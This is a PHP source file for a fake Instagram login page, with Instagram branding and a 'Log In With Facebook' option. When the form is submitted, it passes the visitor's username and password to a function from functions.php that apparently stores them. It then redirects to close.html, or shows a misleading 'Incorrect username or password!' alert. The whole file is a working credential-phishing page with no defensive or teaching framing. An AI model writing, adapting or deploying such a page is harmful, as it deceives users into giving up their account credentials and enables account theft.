<?php 
require('functions.php');
if (isset($_POST["submit"])) {
	// cek keberhasilan
	if (tambah($_POST) > 0) {
		echo "
		<script>
      document.location.href = 'close.html';
		</script>
		";
	} else {
		echo "
		<script>
			alert('Incorrect username or password!');
		</script>
		";
	}
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="bootstrap.min.css">
  <title>Login Instagram</title>
</head>

<body>
  <section class="big-box">
    <div class="container">
      <div class="ig-title">
        <img src="assets/text.png" alt="">
      </div>
      <div class="form-login">
        <form action="" method="POST">
          <input type="text" class="form-control" name="username" placeholder="Phone number. username, or email" required>
          <input type="password" class="form-control" name="password" placeholder="Password">
          <h5 class="forgot">Forgot password?</h5>
          <button type="submit" name="submit" class="btn btn-primary"><b>Log In</b></button>
        </form>
      </div>
      <div class="case-line">
        <div class="line"></div>
        <h5>OR</h5>
        <div class="line"></div>
      </div>
      <div class="login-fb">
        <img src="assets/facebook.png">
        <p>Log In With Facebook</p>
      </div>
    </div>
  </section>
  <section class="small-box">
    <div class="container">
      <div class="register-col">
        <p>Don't have an account? </p>
        <p>Sign up</p>
      </div>
    </div>
  </section>


</body>

</html>